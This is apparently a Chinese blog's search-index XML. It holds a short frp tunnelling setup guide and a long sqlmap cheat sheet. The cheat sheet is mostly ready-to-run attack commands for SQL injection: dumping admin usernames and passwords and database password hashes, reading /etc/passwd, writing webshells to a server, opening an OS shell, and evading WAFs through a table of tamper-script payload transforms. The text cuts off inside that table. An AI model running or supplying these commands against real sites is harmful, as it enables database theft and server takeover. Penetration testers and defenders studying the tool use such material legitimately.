<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>目标网站渗透思路</title>
      <link href="/posts/59d.html"/>
      <url>/posts/59d.html</url>
      
        <content type="html"><![CDATA[<p>水一波~~<br><img src="./medias/loading.gif" data-original="http://imgal.lyscholar.cn/blog/%E6%8C%87%E5%AE%9A%E7%9B%AE%E6%A0%87%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF.jpg" alt="指定目标渗透思路"></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 思路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用frp提高开发效率</title>
      <link href="/posts/ed0.html"/>
      <url>/posts/ed0.html</url>
      
        <content type="html"><![CDATA[<h1 id="阿里云实现-frp-内网穿透"><a href="#阿里云实现-frp-内网穿透" class="headerlink" title="阿里云实现 frp 内网穿透"></a>阿里云实现 frp 内网穿透</h1><p>服务器：centos<br>客户机：Windows</p><p><strong>在阿里云控制面板上要将安全组全部放行！！！</strong><br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582906955637.png" alt="enter description here"></p><p><strong>如果使用了宝塔，也要将宝塔安全中的配置放行</strong><br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907033904.png" alt="enter description here"></p><h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><p>下载地址<br><a href="https://github.com/fatedier/frp/releases/" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases/</a></p><p><strong>注意服务器和客户机的版本要一样</strong></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="服务器上的配置"><a href="#服务器上的配置" class="headerlink" title="服务器上的配置"></a>服务器上的配置</h3><p>在服务器上我们使用的是frps 不用去修改frpc的文件，当然你有这个需求的话可以去修改<br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907307135.png" alt="enter description here"></p><h4 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h4><p><code>vim frps.ini</code></p><pre><code>[common]bind_port = 7000 #你要放行分配客户机使用的端口</code></pre><h4 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h4><p><code>./frps -c frps.ini</code></p><pre class=" language-shell"><code class="language-shell">2020/02/28 23:58:35 [I] [service.go:146] frps tcp listen on 0.0.0.0:70002020/02/28 23:58:35 [I] [root.go:204] Start frps success</code></pre><p><strong>如果出现以上信息代表服务器端frps配置完毕并且开启成功</strong></p><h3 id="客户机上配置"><a href="#客户机上配置" class="headerlink" title="客户机上配置"></a>客户机上配置</h3><p><strong>Windows</strong><br>打开解压之后会有以下文件<br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907307135.png" alt="enter description here"></p><p>这里我们用到的是frpc配置</p><h4 id="修改客户机配置"><a href="#修改客户机配置" class="headerlink" title="修改客户机配置"></a>修改客户机配置</h4><p><code>frpc.ini</code></p><pre class=" language-ini"><code class="language-ini"><span class="token selector">[common]</span><span class="token constant">server_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> xxx.xxx.xxx.xxx   #frp服务端地址，必须是公网ip或者域名</span><span class="token constant">server_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000      #frp服务端端口，即填写服务端配置中的 bind_port</span><span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp              #连接类型，填tcp或udp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1    #填127.0.0.1或内网ip都可以</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22         #需要转发到的端口，ssh端口是22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 6000      #frp服务端的远程监听端口，即你访问服务端的remote_port就相当于访</span>                        #问客户端的 local_port，如果填0则会随机分配一个端口</code></pre><h4 id="运行客户机进行连接"><a href="#运行客户机进行连接" class="headerlink" title="运行客户机进行连接"></a>运行客户机进行连接</h4><p>在frp的文件目录下打开cmd<br><img src="./medias/loading.gif" data-original="http://img.lyscholar.cn/img/1582907892866.png" alt="enter description here"></p><p><strong>以上信息代表成功可以访问frpc.ini中的remote_port所填端口进行访问</strong></p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
            <tag> 技能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap简单使用</title>
      <link href="/posts/74fc.html"/>
      <url>/posts/74fc.html</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p><strong>POST登录框注入：</strong> </p><p><strong>抓包，然后保存抓取到的内容。例如：保存为post.txt,然后把它放至某个目录下</strong> </p><p>sqlmap.py -r 从文件读取数据 -p 指定的参数 –tables</p><p>sqlmap.py -r search-test.txt -p tfUPass </p><p>注：-r表示加载一个文件，-p指定参数 </p><p>sqlmap.py -u 登录的地址 –forms 自动判断注入</p><h4 id="指定参数搜索注入"><a href="#指定参数搜索注入" class="headerlink" title="指定参数搜索注入"></a>指定参数搜索注入</h4><p>sqlmap.py -u 登录的地址 –data “指定参数”</p><p>sqlmap -u [url]<a href="http://testasp.vulnweb.com/Login.asp[/url]" target="_blank" rel="noopener">http://testasp.vulnweb.com/Login.asp[/url]</a> –data “tfUName=321&amp;tfUPass=321”</p><h4 id="自动注册表单，截取数据。-直接在后面加-–forms"><a href="#自动注册表单，截取数据。-直接在后面加-–forms" class="headerlink" title="自动注册表单，截取数据。(直接在后面加[–forms])"></a>自动注册表单，截取数据。(直接在后面加[–forms])</h4><p>sqlmap -u “<a href="http://www.xx.com/Login.asp&quot;" target="_blank" rel="noopener">http://www.xx.com/Login.asp&quot;</a> –forms</p><p><strong>自动搜索表单的方式</strong></p><p>sqlmap.py -u “<a href="http://192.168.160.1/sqltest/post.php&quot;" target="_blank" rel="noopener">http://192.168.160.1/sqltest/post.php&quot;</a> –forms </p><h4 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h4><p>sqlmap.py -u “<a href="http://www.xx.com/Login.asp&quot;" target="_blank" rel="noopener">http://www.xx.com/Login.asp&quot;</a> –data “标签名1=数据1&amp;标签名2=数据2&amp;标签名3=数据3…” </p><p>注：填写的数据可以随意写，但标签名一定要与input标签中的name一致，不同的标签名对应不同的name</p><p>sqlmap -u “<a href="http://www.xx.com/Login.asp&quot;" target="_blank" rel="noopener">http://www.xx.com/Login.asp&quot;</a> –data “Username=1&amp;Password=1”</p><p>注：Username与Password分别为Login.asp页面中的两个输入框的名字，将鼠标移动到输入框上面右击选择“审查元素”即可看到，每台网页的Login页面都不一定是一样的</p><h4 id="COOKIE提交"><a href="#COOKIE提交" class="headerlink" title="COOKIE提交"></a>COOKIE提交</h4><p><strong>指定一个参数的方法</strong> </p><p>sqlmap -u <a href="http://xxx.xxx.com/Login.asp" target="_blank" rel="noopener">http://xxx.xxx.com/Login.asp</a> –data “n=1&amp;p=1” </p><p>python sqlmap.py -u “url” –cookie “id=1” -v 1</p><h6 id="cookie注入，猜解表"><a href="#cookie注入，猜解表" class="headerlink" title="cookie注入，猜解表"></a>cookie注入，猜解表</h6><p>判断数据库，获取服务器，网站环境等参数 </p><p>sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp&quot;" target="_blank" rel="noopener">http://192.168.87.129/shownews.asp&quot;</a> –cookie “id=27<strong>“ –table –level 2</strong> </p><h5 id="猜解字段，-通过1的表猜解字段，假如表为admin"><a href="#猜解字段，-通过1的表猜解字段，假如表为admin" class="headerlink" title="猜解字段，(通过1的表猜解字段，假如表为admin)"></a>猜解字段，(通过1的表猜解字段，假如表为admin)</h5><p>sqlmap.py -u <a href="http://www.xx.com/show.asp" target="_blank" rel="noopener">http://www.xx.com/show.asp</a> –cookie “id=187” –columns -T 数据表 –level 2 </p><p>sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp&quot;" target="_blank" rel="noopener">http://192.168.87.129/shownews.asp&quot;</a> –cookie “id=27” –columns -T admin –level 2</p><h4 id="猜解内容"><a href="#猜解内容" class="headerlink" title="猜解内容"></a>猜解内容</h4><p>sqlmap.py -u <a href="http://www.xx.com/show.asp" target="_blank" rel="noopener">http://www.xx.com/show.asp</a> –cookie “id=187” –dump -T 表名 -C “字段名1,字段名2”  –level 2 </p><p><strong>sqlmap.py -u “<a href="http://192.168.87.129/shownews.asp&quot;" target="_blank" rel="noopener">http://192.168.87.129/shownews.asp&quot;</a> –cookie “id=27” –dump -T admin -C “user,password” –level 2</strong> </p><h4 id="SQLMAP中的请求延迟"><a href="#SQLMAP中的请求延迟" class="headerlink" title="SQLMAP中的请求延迟"></a>SQLMAP中的请求延迟</h4><p>参数 –delay –safe-freq </p><p>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> –delay 1<br>python sqlmap.py –dbs -u “<a href="http://xxx.cn/index.php/Index/view/id/40.html&quot;" target="_blank" rel="noopener">http://xxx.cn/index.php/Index/view/id/40.html&quot;</a> –safe-freq 3</p><h4 id="使用多线程猜解"><a href="#使用多线程猜解" class="headerlink" title="使用多线程猜解"></a>使用多线程猜解</h4><p>python sqlmap.py -u “url” -v 1 –current-user –threads 3</p><h4 id="指定数据库，绕过SQLMAP的自动检测"><a href="#指定数据库，绕过SQLMAP的自动检测" class="headerlink" title="指定数据库，绕过SQLMAP的自动检测"></a>指定数据库，绕过SQLMAP的自动检测</h4><p>python sqlmap.py -u “url” -v 2 –dbms “PostgreSQL”</p><h4 id="指定操作系统绕过SQLMAP自动检测"><a href="#指定操作系统绕过SQLMAP自动检测" class="headerlink" title="指定操作系统绕过SQLMAP自动检测"></a>指定操作系统绕过SQLMAP自动检测</h4><p>python sqlmap.py -u “url” -v 2 –os “Windows”</p><h4 id="union注入测试"><a href="#union注入测试" class="headerlink" title="union注入测试"></a>union注入测试</h4><p>python sqlmap.py -u “url” –union-test -v -1</p><h4 id="绕过waf防火墙："><a href="#绕过waf防火墙：" class="headerlink" title="绕过waf防火墙："></a>绕过waf防火墙：</h4><p>sqlmap.py -u 注入点 -v 3 –dbs –batch –tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py </p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> -v 3 –dbs –batch –tamper “space2morehash.py”</p><h4 id="SQLMAP用于mysql中DDOS攻击-1-获取一个Shell"><a href="#SQLMAP用于mysql中DDOS攻击-1-获取一个Shell" class="headerlink" title="SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell"></a>SQLMAP用于mysql中DDOS攻击(1) 获取一个Shell</h4><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –sql-shell</p><p>-u #注入点<br>-g 谷歌搜索<br>-f #指纹判别数据库类型<br>-b #获取数据库版本信息<br>-p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”)<br>-D “” #指定数据库名<br>-T “” #指定表名<br>-C “” #指定字段<br>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)<br>–columns #列出字段<br>–current-user #获取当前用户名称<br>–current-db #获取当前数据库名称<br>–users #列数据库所有用户<br>–passwords #数据库用户所有密码<br>–privileges #查看用户权限(–privileges -U root)<br>-U #指定数据库用户<br>–dbs #列出所有数据库<br>–tables -D “” #列出指定数据库中的表<br>–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段<br>–dump-all #列出所有数据库所有表<br>–exclude-sysdbs #只列出用户自己新建的数据库和表<br>–dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)<br>–dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据<br>–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)<br>–os #指定系统(Linux,Windows)<br>–sql -shell 写shell<br>–delay 延迟的时间<br>–safe-freq 次数<br>-v #详细的等级(0-6)：<br>0：只显示Python的回溯，错误和关键消息。<br>1：显示信息和警告消息。<br>2：显示调试消息。<br>3：有效载荷注入。<br>4：显示HTTP请求。<br>5：显示HTTP响应头</p><p>6：显示HTTP响应页面的内容</p><h4 id="SQLMAP注入点执行命令与交互写shell"><a href="#SQLMAP注入点执行命令与交互写shell" class="headerlink" title="SQLMAP注入点执行命令与交互写shell"></a>SQLMAP注入点执行命令与交互写shell</h4><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –os-cmd=ipconfig</p><p>sqlmap -u [url]<a href="http://192.168.159.1/news.php?id=1[/url]" target="_blank" rel="noopener">http://192.168.159.1/news.php?id=1[/url]</a> –os-shell</p><h4 id="读取与写入文件"><a href="#读取与写入文件" class="headerlink" title="读取与写入文件"></a>读取与写入文件</h4><p>首先找需要网站的物理路径，其次需要有可写或可读权限。</p><p> –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）</p><p>–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）</p><p>–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径</p><p>sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”</p><h4 id="SQLMAP用于mysql注入"><a href="#SQLMAP用于mysql注入" class="headerlink" title="SQLMAP用于mysql注入"></a>SQLMAP用于mysql注入</h4><p>1) 查找数据库 </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> –dbs</p><p>2) 通过第一步的数据库查找表(假如数据库名为dataname) </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname –tables</p><p>3) 通过2中的表得出列名(假如表为table_name) </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name –columns</p><p>4) 获取字段的值(假如扫描出id,user,password字段) </p><p>python sqlmap.py -u “<a href="http://www.xxx.com/link.php?id=321&quot;" target="_blank" rel="noopener">http://www.xxx.com/link.php?id=321&quot;</a> -D dataname -T table_name -C<br>“id,user,password” –dump</p><h4 id="简单的注入流程"><a href="#简单的注入流程" class="headerlink" title="简单的注入流程"></a>简单的注入流程</h4><h5 id="1-读取数据库版本，当前用户，当前数据库"><a href="#1-读取数据库版本，当前用户，当前数据库" class="headerlink" title="1.读取数据库版本，当前用户，当前数据库"></a>1.读取数据库版本，当前用户，当前数据库</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 -f -b –current-user –current-db -v 1</p><h5 id="2-判断当前数据库用户权限"><a href="#2-判断当前数据库用户权限" class="headerlink" title="2.判断当前数据库用户权限"></a>2.判断当前数据库用户权限</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –privileges -U 用户名 -v 1<br>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –is-dba -U 用户名 -v 1</p><h5 id="3-读取所有数据库用户或指定数据库用户的密码"><a href="#3-读取所有数据库用户或指定数据库用户的密码" class="headerlink" title="3.读取所有数据库用户或指定数据库用户的密码"></a>3.读取所有数据库用户或指定数据库用户的密码</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –users –passwords -v 2<br>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –passwords -U root -v 2</p><h5 id="4-获取所有数据库"><a href="#4-获取所有数据库" class="headerlink" title="4.获取所有数据库"></a>4.获取所有数据库</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –dbs -v 2</p><h5 id="5-获取指定数据库中的所有表"><a href="#5-获取指定数据库中的所有表" class="headerlink" title="5.获取指定数据库中的所有表"></a>5.获取指定数据库中的所有表</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –tables -D mysql -v 2</p><h5 id="6-获取指定数据库名中指定表的字段"><a href="#6-获取指定数据库名中指定表的字段" class="headerlink" title="6.获取指定数据库名中指定表的字段"></a>6.获取指定数据库名中指定表的字段</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –columns -D mysql -T users -v 2</p><h5 id="7-获取指定数据库名中指定表中指定字段的数据"><a href="#7-获取指定数据库名中指定表中指定字段的数据" class="headerlink" title="7.获取指定数据库名中指定表中指定字段的数据"></a>7.获取指定数据库名中指定表中指定字段的数据</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2</p><h5 id="8-file-read读取web文件"><a href="#8-file-read读取web文件" class="headerlink" title="8.file-read读取web文件"></a>8.file-read读取web文件</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –file-read “/etc/passwd” -v 2</p><h5 id="9-file-write写入文件到web"><a href="#9-file-write写入文件到web" class="headerlink" title="9.file-write写入文件到web"></a>9.file-write写入文件到web</h5><p>sqlmap -u <a href="http://www.xxxxxx.com/" target="_blank" rel="noopener">http://www.xxxxxx.com/</a> test.php?p=2 –file-write /localhost/mm.php –file-dest</p><h5 id="将本地的test-txt写入到站点服务器的html目录下"><a href="#将本地的test-txt写入到站点服务器的html目录下" class="headerlink" title="将本地的test.txt写入到站点服务器的html目录下"></a>将本地的test.txt写入到站点服务器的html目录下</h5><p>sqlmap.py -u “<a href="http://www.xxxxxx.com/sql-injection.php?id=1&quot;" target="_blank" rel="noopener">http://www.xxxxxx.com/sql-injection.php?id=1&quot;</a> –file-write /test/test.txt –file-dest /var/www/html/1.txt</p><h4 id="获取字段中的内容"><a href="#获取字段中的内容" class="headerlink" title="获取字段中的内容"></a>获取字段中的内容</h4><p>sqlmap -u “<a href="http://www.xxx.com/xx.asp?id=xxx”" target="_blank" rel="noopener">http://www.xxx.com/xx.asp?id=xxx”</a> –dump -T 表名 -C “字段名1,字段名2…”</p><h4 id="脱裤子"><a href="#脱裤子" class="headerlink" title="脱裤子"></a>脱裤子</h4><p>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump –threads=5 –start=1 –stop=5000</p><p>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump-all -v 0</p><p>sqlmap.py -u url  判断<br>sqlmap.py -u url –is-dba -v   这是判断当前数据库的使用者是否是dba<br>sqlmap.py -u url –users -v 0  这句的目的是列举数据库的用户<br>sqlmap.py -u url –passwords -v 0 这句的目的是获取数据库用户的密码<br>sqlmap.py -u url –privileges -v 0 这是判断当前的权限<br>sqlmap.py -u url –dbs -v 0 这句的目的是将所有的数据库列出来<br>sqlmap.py -u url –tables -D ‘表’ 爆表<br>sqlmap.py -u url –columns -T ‘表’-D ‘数据库’爆列<br>sqlmap.py -u url –dump -T ‘表’ –start 1 –stop 4 -v 0 这里是查询第2到第4行的内<br>sqlmap.py -u url –dump -all -v 0</p><p>sqlmap tamper</p><table><thead><tr><th>支持的数据库</th><th>编号</th><th>脚本名称</th><th>作用</th><th>实现方式</th></tr></thead><tbody><tr><td>all</td><td>1</td><td>apostrophemask.py</td><td>用utf8代替引号</td><td>(“1 AND ‘1’=’1”) ‘1 AND %EF%BC%871%EF%BC%87=%EF%BC%871’</td></tr><tr><td>2</td><td>base64encode.py</td><td>用base64编码替换</td><td>(“1’ AND SLEEP(5)#”)’MScgQU5EIFNMRUVQKDUpIw==’</td><td></td></tr><tr><td>3</td><td>multiplespaces.py</td><td>围绕SQL关键字添加多个空格</td><td>(‘1 UNION SELECT foobar’)’1    UNION     SELECT   foobar’</td><td></td></tr><tr><td>4</td><td>space2plus.py</td><td>用+替换空格</td><td>(‘SELECT id FROM users’)’SELECT+id+FROM+users’</td><td></td></tr><tr><td>5</td><td>nonrecursivereplacement.py</td><td>双重查询语句。取代predefined SQL关键字with表示 suitable for替代（例如  .replace（“SELECT”、””)） filters</td><td>(‘1 UNION SELECT 2–’)’1 UNIOUNIONN SELESELECTCT 2–’</td><td></td></tr><tr><td>6</td><td>space2randomblank.py</td><td>代替空格字符（“”）从一个随机的空白字符可选字符的有效集</td><td>(‘SELECT id FROM users’)’SELECT%0Did%0DFROM%0Ausers’</td><td></td></tr><tr><td>7</td><td>unionalltounion.py</td><td>替换UNION ALL SELECT UNION SELECT</td><td>(‘-1 UNION ALL SELECT’)’-1 UNION SELECT’</td><td></td></tr><tr><td>8</td><td>securesphere.py</td><td>追加特制的字符串</td><td>(‘1 AND 1=1’)”1 AND 1=1 and ‘0having’=’0having’”</td><td></td></tr><tr><td>mssql</td><td>1</td><td>space2hash.py</td><td>绕过过滤‘=’ 替换空格字符（”），（’ – ‘）后跟一个破折号注释，一个随机字符串和一个新行（’ n’）</td><td>‘1 AND 9227=9227’ ‘1–nVNaVoPYeva%0AAND–ngNvzqu%0A9227=9227’</td></tr><tr><td>2</td><td>equaltolike.py</td><td>like 代替等号</td><td>* Input: SELECT * FROM users WHERE id=1 2 * Output: SELECT * FROM users WHERE id LIKE 1</td><td></td></tr><tr><td>3</td><td>space2mssqlblank.py(mssql)</td><td>空格替换为其它空符号</td><td>Input: SELECT id FROM usersOutput: SELECT%08id%02FROM%0Fusers</td><td></td></tr><tr><td>4</td><td>space2mssqlhash.py</td><td>替换空格</td><td>(‘1 AND 9227=9227’)’1%23%0AAND%23%0A9227=9227’</td><td></td></tr><tr><td>5</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>6</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td>7</td><td>sp_password.py</td><td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td><td>(‘1 AND 9227=9227– ‘)’1 AND 9227=9227– sp_password’</td><td></td></tr><tr><td>8</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>9</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>10</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>11</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>mysql &gt;= 5.1.13</td><td>1</td><td>equaltolike.py</td><td>like 代替等号</td><td>* Input: SELECT * FROM users WHERE id=1 2 * Output: SELECT * FROM users WHERE id LIKE 1</td></tr><tr><td>2</td><td>greatest.py</td><td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td><td>(‘1 AND A &gt; B’)’1 AND GREATEST(A,B+1)=A’</td><td></td></tr><tr><td>3</td><td>apostrophenullencode.py</td><td>绕过过滤双引号，替换字符和双引号。</td><td>tamper(“1 AND ‘1’=’1”) ‘1 AND %00%271%00%27=%00%271’</td><td></td></tr><tr><td>4</td><td>ifnull2ifisnull.py</td><td>绕过对 IFNULL 过滤。替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td><td>(‘IFNULL(1, 2)’)’IF(ISNULL(1),2,1)’</td><td></td></tr><tr><td>5</td><td>space2mssqlhash.py</td><td>替换空格</td><td>(‘1 AND 9227=9227’)’1%23%0AAND%23%0A9227=9227’</td><td></td></tr><tr><td>6</td><td>modsecurityversioned.py</td><td>过滤空格，包含完整的查询版本注释</td><td>(‘1 AND 2&gt;1–’)’1 /<em>!30874AND 2&gt;1</em>/–’</td><td></td></tr><tr><td>7</td><td>space2mysqlblank.py</td><td>空格替换其它空白符号(mysql)</td><td>Input: SELECT id FROM usersOutput: SELECT%0Bid%0BFROM%A0users</td><td></td></tr><tr><td>8</td><td>between.py</td><td>用between替换大于号（&gt;）</td><td>(‘1 AND A &gt; B–’)’1 AND A NOT BETWEEN 0 AND B–’</td><td></td></tr><tr><td>9</td><td>modsecurityzeroversioned.py</td><td>包含了完整的查询与零版本注释</td><td>(‘1 AND 2&gt;1–’)’1 /<em>!00000AND 2&gt;1</em>/–’</td><td></td></tr><tr><td>10</td><td>space2mysqldash.py</td><td>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</td><td>(‘1 AND 9227=9227’)’1–%0AAND–%0A9227=9227’</td><td></td></tr><tr><td>11</td><td>bluecoat.py</td><td>代替空格字符后与一个有效的随机空白字符的SQL语句。然后替换=为like</td><td>(‘SELECT id FROM users where id = 1’)’SELECT%09id FROM users where id LIKE 1’</td><td></td></tr><tr><td>12</td><td>percentage.py</td><td>asp允许每个字符前面添加一个%号</td><td>* Input: SELECT FIELD FROM TABLE* Output: %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</td><td></td></tr><tr><td>13</td><td>charencode.py</td><td>url编码</td><td>* Input: SELECT FIELD FROM%20TABLE* Output: %53%45%4c%45%43%54%20%46%49%45%4c%44%20%46%52%4f%4d%20%54%41%42%4c%45</td><td></td></tr><tr><td>14</td><td>randomcase.py</td><td>随机大小写</td><td>* Input: INSERT* Output: InsERt</td><td></td></tr><tr><td>15</td><td>versionedkeywords.py</td><td>Encloses each non-function keyword with versioned MySQL comment</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#* Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS**!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</td><td></td></tr><tr><td>16</td><td>space2comment.py</td><td>Replaces space character (‘ ‘) with comments ‘/**/’</td><td>* Input: SELECT id FROM users* Output: SELECT//id//FROM/**/users</td><td></td></tr><tr><td>17</td><td>charunicodeencode.py</td><td>字符串 unicode 编码</td><td>* Input: SELECT FIELD%20FROM TABLE* Output: %u0053%u0045%u004c%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004c%u0044%u0020%u0046%u0052%u004f%u004d%u0020%u0054%u0041%u0042%u004c%u0045′</td><td></td></tr><tr><td>18</td><td>versionedmorekeywords.py</td><td>注释绕过</td><td>* Input: 1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#* Output: 1/<em>!UNION<strong>!ALL</strong>!SELECT**!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS**!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</td><td></td></tr><tr><td>MySQL &lt; 5.1</td><td>19</td><td>halfversionedmorekeywords.py</td><td>关键字前加注释</td><td>* Input: value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa* Output: value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)), NULL, NULL#/</em>!0AND ‘QDWa’=’QDWa</td></tr><tr><td>20</td><td>halfversionedmorekeywords.py</td><td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td><td>1.(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS 